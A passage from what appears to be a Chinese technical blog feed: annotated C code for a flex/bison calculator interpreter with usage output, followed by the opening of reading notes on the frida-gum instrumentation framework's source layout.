class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>: v = (eval(a-&gt;l) &lt;= eval(a-&gt;r))? <span class="number">1</span> : <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这部分是对条件表达式的ast的求值</span></span><br><span class="line">  <span class="comment">//比如if else 这些</span></span><br><span class="line">  <span class="comment">/* control flow */</span></span><br><span class="line">  <span class="comment">/* null if/else/do expressions allowed in the grammar, so check for them */</span></span><br><span class="line">  case &#x27;I’:</span><br><span class="line">    <span class="comment">//条件成立，走then或者do的分支</span></span><br><span class="line">    <span class="keyword">if</span>( eval( ((struct flow *)a)-&gt;cond) != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>( ((struct flow *)a)-&gt;tl) &#123;</span><br><span class="line">    v = eval( ((struct flow *)a)-&gt;tl);</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">    v = <span class="number">0.0</span>;        <span class="comment">/* a default value */</span></span><br><span class="line">    <span class="comment">//不成立，走else分支</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>( ((struct flow *)a)-&gt;el) &#123;</span><br><span class="line">        v = eval(((struct flow *)a)-&gt;el);</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">    v = <span class="number">0.0</span>;        <span class="comment">/* a default value */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// while语句</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;W&#x27;</span>:</span><br><span class="line">    v = <span class="number">0.0</span>;        <span class="comment">/* a default value */</span></span><br><span class="line">    <span class="comment">//条件成立，走do的逻辑</span></span><br><span class="line">    <span class="keyword">if</span>( ((struct flow *)a)-&gt;tl) &#123;</span><br><span class="line">      <span class="keyword">while</span>( eval(((struct flow *)a)-&gt;cond) != <span class="number">0</span>)</span><br><span class="line">    v = eval(((struct flow *)a)-&gt;tl);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//不成立，凉凉，啥都不做</span></span><br><span class="line">    <span class="keyword">break</span>;            <span class="comment">/* last value is value */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//语句列表</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>: eval(a-&gt;l); v = eval(a-&gt;r); <span class="keyword">break</span>;</span><br><span class="line">  <span class="comment">//函数</span></span><br><span class="line">  <span class="comment">//func(param…);</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>: v = callbuiltin((struct fncall *)a); <span class="keyword">break</span>;</span><br><span class="line">  <span class="comment">//用户调用部分</span></span><br><span class="line">  <span class="comment">//比如 call xxx();</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: v = calluser((struct ufncall *)a); <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>: <span class="built_in">printf</span>(<span class="string">&quot;internal error: bad node %c\n&quot;</span>, a-&gt;nodetype);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一些内建函数的实现，cc支持的</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">double</span></span><br><span class="line">callbuiltin(struct fncall *f)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">bifs</span> <span class="title">functype</span> =</span> f-&gt;functype;</span><br><span class="line">  <span class="keyword">double</span> v = eval(f-&gt;l);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">switch</span>(functype) &#123;</span><br><span class="line"> <span class="keyword">case</span> B_sqrt:</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">sqrt</span>(v);</span><br><span class="line"> <span class="keyword">case</span> B_exp:</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">exp</span>(v);</span><br><span class="line"> <span class="keyword">case</span> B_log:</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">log</span>(v);</span><br><span class="line"> <span class="keyword">case</span> B_print:</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;= %4.4g\n&quot;</span>, v);</span><br><span class="line">   <span class="keyword">return</span> v;</span><br><span class="line"> <span class="keyword">default</span>:</span><br><span class="line">   yyerror(<span class="string">&quot;Unknown built-in function %d&quot;</span>, functype);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数调用的实现，比较重要的部分。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">double</span></span><br><span class="line">calluser(struct ufncall *f)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//获取函数的信息，函数名，参数等</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">symbol</span> *<span class="title">fn</span> =</span> f-&gt;s;    <span class="comment">/* function name */</span></span><br><span class="line">  <span class="comment">//形参</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">symlist</span> *<span class="title">sl</span>;</span>        <span class="comment">/* dummy arguments */</span></span><br><span class="line">  <span class="comment">//实参</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ast</span> *<span class="title">args</span> =</span> f-&gt;l;    <span class="comment">/* actual arguments */</span></span><br><span class="line">  <span class="comment">//保存的参数</span></span><br><span class="line">  <span class="keyword">double</span> *oldval, *newval;    <span class="comment">/* saved arg values */</span></span><br><span class="line">  <span class="keyword">double</span> v;</span><br><span class="line">  <span class="keyword">int</span> nargs;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!fn-&gt;func) &#123;</span><br><span class="line">    yyerror(<span class="string">&quot;call to undefined function&quot;</span>, fn-&gt;name);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//获取参数数量，从形参列表遍历获得</span></span><br><span class="line">  <span class="comment">/* count the arguments */</span></span><br><span class="line">  sl = fn-&gt;syms;</span><br><span class="line">  <span class="keyword">for</span>(nargs = <span class="number">0</span>; sl; sl = sl-&gt;next)</span><br><span class="line">    nargs++;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//为保存参数分配空间</span></span><br><span class="line">  <span class="comment">/* prepare to save them */</span></span><br><span class="line">  oldval = (<span class="keyword">double</span> *)<span class="built_in">malloc</span>(nargs * <span class="keyword">sizeof</span>(<span class="keyword">double</span>));</span><br><span class="line">  newval = (<span class="keyword">double</span> *)<span class="built_in">malloc</span>(nargs * <span class="keyword">sizeof</span>(<span class="keyword">double</span>));</span><br><span class="line">  <span class="keyword">if</span>(!oldval || !newval) &#123;</span><br><span class="line">    yyerror(<span class="string">&quot;Out of space in %s&quot;</span>, fn-&gt;name); <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//参数可能是表达式，所以需要对其求值。</span></span><br><span class="line">  <span class="comment">//比如 max(1+2,5) 就需要对第一个参数先求值，然后再进行计算。</span></span><br><span class="line">  <span class="comment">/* evaluate the arguments */</span></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nargs; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!args) &#123;</span><br><span class="line">      yyerror(<span class="string">&quot;too few args in call to %s&quot;</span>, fn-&gt;name);</span><br><span class="line">      <span class="built_in">free</span>(oldval); <span class="built_in">free</span>(newval);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(args-&gt;nodetype == <span class="string">&#x27;L&#x27;</span>) &#123;    <span class="comment">/* if this is a list node */</span></span><br><span class="line">      newval[i] = eval(args-&gt;l);</span><br><span class="line">      args = args-&gt;r;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;            <span class="comment">/* if it&#x27;s the end of the list */</span></span><br><span class="line">      newval[i] = eval(args);</span><br><span class="line">      args = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//保存形参的旧值，然后更新新值</span></span><br><span class="line">  <span class="comment">//比如 max(1+2,4-1) 更新成 max(3，3)</span></span><br><span class="line">  <span class="comment">/* save old values of dummies, assign new ones */</span></span><br><span class="line">  sl = fn-&gt;syms;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nargs; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">symbol</span> *<span class="title">s</span> =</span> sl-&gt;sym;</span><br><span class="line"></span><br><span class="line">    oldval[i] = s-&gt;value;</span><br><span class="line">    s-&gt;value = newval[i];</span><br><span class="line">    sl = sl-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(newval);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* evaluate the function */</span> <span class="comment">//参数都更新完了之后，就可以直接去计算函数值了</span></span><br><span class="line">  v = eval(fn-&gt;func);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* put the dummies back */</span>  <span class="comment">//因为之前更改了形参的list，现在要恢复</span></span><br><span class="line">  sl = fn-&gt;syms;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nargs; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">symbol</span> *<span class="title">s</span> =</span> sl-&gt;sym;</span><br><span class="line"></span><br><span class="line">    s-&gt;value = oldval[i];</span><br><span class="line">    sl = sl-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(oldval);</span><br><span class="line">  <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//释放节点，分情况，因为不同的操作符，子树数目不同，所以要分情况。</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">treefree(struct ast *a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span>(a-&gt;nodetype) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* two subtrees */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:  <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:  <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:  <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:  <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:  <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">    treefree(a-&gt;r);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* one subtree */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;|&#x27;</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>:</span><br><span class="line">    treefree(a-&gt;l);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* no subtree */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;K&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">    <span class="built_in">free</span>( ((struct symasgn *)a)-&gt;v);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;W&#x27;</span>:</span><br><span class="line">    <span class="built_in">free</span>( ((struct flow *)a)-&gt;cond);</span><br><span class="line">    <span class="keyword">if</span>( ((struct flow *)a)-&gt;tl) <span class="built_in">free</span>( ((struct flow *)a)-&gt;tl);</span><br><span class="line">    <span class="keyword">if</span>( ((struct flow *)a)-&gt;el) <span class="built_in">free</span>( ((struct flow *)a)-&gt;el);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>: <span class="built_in">printf</span>(<span class="string">&quot;internal error: free bad node %c\n&quot;</span>, a-&gt;nodetype);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a); <span class="comment">/* always free the node itself */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">yyerror(<span class="keyword">char</span> *s, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  va_start(ap, s);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%d: error: &quot;</span>, yylineno);</span><br><span class="line">  <span class="built_in">vfprintf</span>(<span class="built_in">stderr</span>, s, ap);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> yyparse();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把ast dump出来做显示，方便调试</span></span><br><span class="line"><span class="comment">/* debugging: dump out an AST */</span></span><br><span class="line"><span class="keyword">int</span> debug = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">dumpast(struct ast *a, <span class="keyword">int</span> level)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%*s&quot;</span>, <span class="number">2</span>*level, <span class="string">&quot;&quot;</span>);    <span class="comment">/* indent to this level */</span></span><br><span class="line">  level++;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NULL\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span>(a-&gt;nodetype) &#123;</span><br><span class="line">    <span class="comment">/* constant */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;K&#x27;</span>: <span class="built_in">printf</span>(<span class="string">&quot;number %4.4g\n&quot;</span>, ((struct numval *)a)-&gt;number); <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* name reference */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;N&#x27;</span>: <span class="built_in">printf</span>(<span class="string">&quot;ref %s\n&quot;</span>, ((struct symref *)a)-&gt;s-&gt;name); <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* assignment */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;=&#x27;</span>: <span class="built_in">printf</span>(<span class="string">&quot;= %s\n&quot;</span>, ((struct symref *)a)-&gt;s-&gt;name);</span><br><span class="line">    dumpast( ((struct symasgn *)a)-&gt;v, level); <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* expressions */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;binop %c\n&quot;</span>, a-&gt;nodetype);</span><br><span class="line">    dumpast(a-&gt;l, level);</span><br><span class="line">    dumpast(a-&gt;r, level);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;|&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;unop %c\n&quot;</span>, a-&gt;nodetype);</span><br><span class="line">    dumpast(a-&gt;l, level);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;W&#x27;</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flow %c\n&quot;</span>, a-&gt;nodetype);</span><br><span class="line">    dumpast( ((struct flow *)a)-&gt;cond, level);</span><br><span class="line">    <span class="keyword">if</span>( ((struct flow *)a)-&gt;tl)</span><br><span class="line">      dumpast( ((struct flow *)a)-&gt;tl, level);</span><br><span class="line">    <span class="keyword">if</span>( ((struct flow *)a)-&gt;el)</span><br><span class="line">      dumpast( ((struct flow *)a)-&gt;el, level);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;builtin %d\n&quot;</span>, ((struct fncall *)a)-&gt;functype);</span><br><span class="line">    dumpast(a-&gt;l, level);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: <span class="built_in">printf</span>(<span class="string">&quot;call %s\n&quot;</span>, ((struct ufncall *)a)-&gt;s-&gt;name);</span><br><span class="line">    dumpast(a-&gt;l, level);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>: <span class="built_in">printf</span>(<span class="string">&quot;bad %c\n&quot;</span>, a-&gt;nodetype);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="0x03-使用"><a href="#0x03-使用" class="headerlink" title="0x03: 使用"></a>0x03: 使用</h4><p>测试环境 ubuntu 16.04 x64<br>这部分没啥意思，随便测试下就好了，主要还是看上面的代码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># muhe @ ubuntu in ~/flexbison [20:49:52] </span>$ ./fb3-2 &gt; 1+123=  124&gt; 1=    1&gt; 2=    2&gt; 1.1+2=  3.1&gt; 3.33333/1.2344=  2.7</span><br><span class="line">&gt; <span class="built_in">let</span> max(x,y) = <span class="keyword">if</span> x &gt;= y <span class="keyword">then</span> x;<span class="keyword">else</span> y;;Defined max&gt; max(0.1,-0.2)=  0.1&gt; max(99999999999999999999999999999999999999999,999999999999999999999999999999999999999999999999999999999999999999999999999)= 1e+75&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>设置了debug之后可以看到ast，方便调试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&gt; <span class="built_in">let</span> max(x,y) = <span class="keyword">if</span> x &gt;= y <span class="keyword">then</span> x;<span class="keyword">else</span> y;;Defined max&gt; max(1,2)call max  binop L    number    1    number    2=    2&gt; </span><br><span class="line">&gt; </span><br></pre></td></tr></table></figure>


<h4 id="0x04-sql分析"><a href="#0x04-sql分析" class="headerlink" title="0x04: sql分析"></a>0x04: sql分析</h4><p>书中第四章是一个sql的分析器，含词法分析、语法分析，代码量还好不算特别大。</p>
<p>目录结构:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tree .</span><br><span class="line">.</span><br><span class="line">├── Makefile</span><br><span class="line">├── glrmysql.l  <span class="comment">#mysql子集词法分析器</span></span><br><span class="line">├── glrmysql.y  <span class="comment">#mysql子集语法分析器</span></span><br><span class="line">├── lpmysql.l</span><br><span class="line">├── lpmysql.y</span><br><span class="line">├── pmysql.l</span><br><span class="line">└── pmysql.y</span><br></pre></td></tr></table></figure>
<p><code>*.l</code>是词法分析部分，<code>*.y</code>是语法分析部分。</p>
<p>这里有三份代码，<code>glrxxxxx</code>是第四章的代码，<code>lpmxxxx</code>是第八章的代码，<code>pmysqlxx</code>是第九章的代码，这里只看第四章的代码，这个例子比较简单，简化了很多东西。</p>
<h4 id="0x05-引用"><a href="#0x05-引用" class="headerlink" title="0x05: 引用"></a>0x05: 引用</h4><p><a href="https://www.zhihu.com/question/20750344">在编程概念中，表达式和语句分别是什么概念？</a><br><a href="https://zh.wikipedia.org/wiki/%E5%B7%A6%E9%81%9E%E6%AD%B8">左递归</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>Study</tag>
      </tags>
  </entry>
  <entry>
    <title>frida-gum代码阅读笔记</title>
    <url>/2019/11/15/frida-gum%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/</url>
    <content><![CDATA[<h2 id="0x00-前言与预备知识"><a href="#0x00-前言与预备知识" class="headerlink" title="0x00 : 前言与预备知识"></a>0x00 : 前言与预备知识</h2><p><code>frida</code> :  frida是一个优秀的跨平台<code>Dynamic instrumentation toolkit</code>，具体可以看<a href="https://www.frida.re/">官网介绍</a></p>
<p><a href="https://www.ibm.com/developerworks/cn/linux/l-gobject/index.html">GObject对象系统</a></p>
<a id="more"></a>

<p>GObject这个比较重要，因为frida框架底层的hook框架Frida-gum是纯c写的，为了实现一些面向对象的编程，使用了Gobject。</p>
<p>注：本篇主要是看<code>interceptor</code>这种hook方式，针对函数头，之后会有一篇针对<code>Stalker</code> 模式的分析。</p>
<h2 id="0x01-项目构架"><a href="#0x01-项目构架" class="headerlink" title="0x01 : 项目构架"></a>0x01 : 项目构架</h2><p>直接拉下来的代码如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">╭─muhe@muheMacBookPro ~/Code/frida ‹master*›</span><br><span class="line">╰─$ l</span><br><span class="line">total 137608</span><br><span class="line">drwxr-xr-x  29 muhe  staff   928B Nov 13 17:22 .</span><br><span class="line">drwxr-xr-x  90 muhe  staff   2.8K Nov  5 16:44 ..</span><br><span class="line">drwxr-xr-x  15 muhe  staff   480B Nov 15 18:23 .git</span><br><span class="line">-rw-r--r--   1 muhe  staff   383B Jan 21  2019 .gitignore</span><br><span class="line">-rw-r--r--   1 muhe  staff   886B Jan 21  2019 .gitmodules</span><br><span class="line">drwxr-xr-x   3 muhe  staff    96B Nov 13 17:22 .vscode</span><br><span class="line">-rw-r--r--   1 muhe  staff   2.4K Jan 21  2019 COPYING</span><br><span class="line">-rw-r--r--   1 muhe  staff   1.2K Nov  7 18:11 Makefile</span><br><span class="line">-rw-r--r--   1 muhe  staff    28K Nov  7 18:11 Makefile.linux.mk</span><br><span class="line">-rw-r--r--   1 muhe  staff    28K Nov  7 18:11 Makefile.macos.mk</span><br><span class="line">-rw-r--r--   1 muhe  staff    21K Nov  7 18:11 Makefile.sdk.mk</span><br><span class="line">-rw-r--r--   1 muhe  staff    84K Apr 29  2019 Makefile.toolchain.mk</span><br><span class="line">-rw-r--r--   1 muhe  staff   1.7K Nov  7 18:11 README.md</span><br><span class="line">drwxr-xr-x  10 muhe  staff   320B Nov 11 14:59 build</span><br><span class="line">drwxr-xr-x  61 muhe  staff   1.9K Jan 21  2019 capstone</span><br><span class="line">-rw-r--r--   1 muhe  staff   1.0K Nov  7 18:11 config.mk</span><br><span class="line">drwxr-xr-x   9 muhe  staff   288B Jan 21  2019 frida-clr</span><br><span class="line">drwxr-xr-x  21 muhe  staff   672B Jan 21  2019 frida-core</span><br><span class="line">drwxr-xr-x  20 muhe  staff   640B Nov 11 17:37 frida-gum</span><br><span class="line">drwxr-xr-x  15 muhe  staff   480B Jan 21  2019 frida-node</span><br><span class="line">drwxr-xr-x  20 muhe  staff   640B Jan 21  2019 frida-python</span><br><span class="line">drwxr-xr-x  27 muhe  staff   864B Jan 21  2019 frida-qml</span><br><span class="line">drwxr-xr-x  10 muhe  staff   320B Jan 21  2019 frida-swift</span><br><span class="line">drwxr-xr-x  12 muhe  staff   384B Jan 21  2019 frida-tools</span><br><span class="line">-rw-r--r--   1 muhe  staff    25K Nov  7 18:11 frida.sln</span><br><span class="line">-rw-r--r--   1 muhe  staff   9.0K Nov 11 14:43 frida.srctrlbm</span><br><span class="line">-rw-r--r--   1 muhe  staff    67M Nov 11 14:43 frida.srctrldb</span><br><span class="line">-rw-r--r--   1 muhe  staff   6.1K Nov 11 14:35 frida.srctrlprj</span><br><span class="line">drwxr-xr-x  47 muhe  staff   1.5K Nov  7 18:11 releng</span><br></pre></td></tr></table></figure>

<p><code>frida-gum</code>是底层hook框架，跨平台；</p>
<p><code>frida-python</code> , <code>frida-node</code>啥的是 bindings，暂时不管，不理解原理看也看不懂；</p>
<p><code>capstone</code> 牛逼的反汇编框架，<code>frida-gum</code>中用到了，用于指令的读；</p>
<p><code>releng</code> 编译相关的；</p>
<p><code>frida-core</code>  server/agent相关；</p>
<p><code>frida-tools</code> 一些工具，比如frida-ps啥的。</p>
<p>重点是<code>frida-gum</code> ，这是理解这个框架的基础。</p>
<h2 id="0x02-阅读frida-gum-x86为例"><a href="#0x02-阅读frida-gum-x86为例" class="headerlink" title="0x02 : 阅读frida-gum (x86为例)"></a>0x02 : 阅读<code>frida-gum</code> (x86为例)</h2><p><code>frida-gum</code> 注释并不多，甚至可以说几乎没，好在他代码写得好，构架合理代码规范好，所以阅读起来多读几遍，总会看懂的。</p>
<h3 id="2-1-构架"><a href="#2-1-构架" class="headerlink" title="2.1. 构架"></a>2.1. 构架</h3><p>这个的框架的构架如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">total 200</span><br><span class="line">drwxr-xr-x  20 muhe  staff   640B Nov 11 17:37 .</span><br><span class="line">drwxr-xr-x  29 muhe  staff   928B Nov 13 17:22 ..</span><br><span class="line">-rw-r--r--   1 muhe  staff    34B Jan 21  2019 .git</span><br><span class="line">-rw-r--r--   1 muhe  staff    70B Jan 21  2019 .gitignore</span><br><span class="line">drwxr-xr-x   3 muhe  staff    96B Nov 11 17:37 .vscode</span><br><span class="line">-rw-r--r--   1 muhe  staff   5.6K Jan 21  2019 COPYING</span><br><span class="line">drwxr-xr-x   5 muhe  staff   160B Jan 21  2019 bindings</span><br><span class="line">-rw-r--r--   1 muhe  staff   2.1K Jan 21  2019 config.h.in</span><br><span class="line">drwxr-xr-x   3 muhe  staff    96B Jan 21  2019 ext</span><br><span class="line">drwxr-xr-x  85 muhe  staff   2.7K Jan 21  2019 gum</span><br><span class="line">-rw-r--r--   1 muhe  staff   5.1K Jan 21  2019 gum-32.vcxproj</span><br><span class="line">-rw-r--r--   1 muhe  staff    16K Jan 21  2019 gum-32.vcxproj.filters</span><br><span class="line">-rw-r--r--   1 muhe  staff   5.1K Jan 21  2019 gum-64.vcxproj</span><br><span class="line">-rw-r--r--   1 muhe  staff    16K Jan 21  2019 gum-64.vcxproj.filters</span><br><span class="line">-rw-r--r--   1 muhe  staff   8.5K Jan 21  2019 gum-common.props</span><br><span class="line">drwxr-xr-x   4 muhe  staff   128B Jan 21  2019 libs</span><br><span class="line">-rw-r--r--   1 muhe  staff   6.8K Jan 21  2019 meson.build</span><br><span class="line">-rw-r--r--   1 muhe  staff   190B Jan 21  2019 meson_options.txt</span><br><span class="line">drwxr-xr-x  28 muhe  staff   896B Jan 21  2019 tests</span><br><span class="line">drwxr-xr-x   7 muhe  staff   224B Jan 21  2019 vapi</span><br></pre></td></tr></table></figure>

<p>核心是在gum目录下</p>
